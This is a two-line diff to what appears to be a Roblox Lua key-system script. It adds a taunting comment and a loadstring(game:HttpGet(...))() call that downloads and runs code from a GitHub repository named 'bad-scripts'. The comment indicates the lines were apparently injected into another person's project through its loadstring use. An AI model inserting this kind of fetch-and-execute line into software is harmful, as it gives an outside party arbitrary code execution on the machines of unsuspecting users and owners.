@@ -1,0 +1,2 @@
+-- ps if you don't want this happening, keep it out of a loadstring next time in your key system
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/bad-scripts/refs/heads/main/raw.txt"))()
